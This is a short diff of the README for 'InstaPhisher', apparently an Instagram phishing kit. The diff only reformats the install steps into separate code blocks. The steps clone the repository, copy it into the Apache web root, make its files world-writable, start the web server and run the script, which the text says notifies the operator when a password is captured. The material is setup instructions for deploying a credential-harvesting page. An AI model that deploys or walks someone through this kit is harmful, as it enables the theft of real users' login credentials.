@@ -34,12 +34,26 @@ The InstaPhisher file is only used to notify you when a new password is captured
 
 ```
 git clone https://github.com/ExilasP/InstaPhisher.git
+```
+```
 cd InstaPhisher
+```
+```
 cp * -r '/var/www/html'
+```
+```
 cd /var/www/html
+```
+```
 touch logs.txt
+```
+```
 sudo chmod +777 login.php && sudo chmod +777 InstaPhisher.py && chmod +777 logs.txt
+```
+```
 service apache2 start
+```
+```
 python InstaPhisher.py
 ```
 
